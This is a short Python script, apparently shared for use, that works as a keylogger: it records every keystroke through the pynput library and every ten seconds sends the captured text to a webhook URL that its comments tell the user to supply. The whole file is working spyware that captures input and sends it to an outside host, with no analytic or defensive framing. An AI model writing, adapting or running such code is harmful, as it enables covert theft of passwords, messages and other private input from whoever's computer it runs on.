import requests
import threading
import os
from pynput import keyboard
from dotenv import load_dotenv

# Note: os and dotenv not needed for this script. Only included to hide webhook URL. 
# Replace "os.getenv("WEBHOOK_URL")" with your webhook URL. 

# Timing can be adjusted by changing the number in the threading.Timer() function. This will change
# the polling delay.

load_dotenv() # Delete line for personal use.

log = ""
WEBHOOK_URL = os.getenv("WEBHOOK_URL") #Replace with your webhook URL.

def report():
    global log
    if log:
        requests.post(WEBHOOK_URL, json={"content": log})
        log = ""
    
    timer = threading.Timer(10, report)
    timer.start()

def on_press(key):
    global log
    try:     
        log = log + key.char
    except AttributeError:
        if key == keyboard.Key.space:
            log = log + " "
        elif key == keyboard.Key.enter:
            log = log + "\n"
        else:
            log = log + ('[' + str(key) + ']')
    if key == keyboard.Key.esc:
        return False

if __name__ == "__main__":
    report()
    with keyboard.Listener(on_press=on_press) as listener:
        listener.join()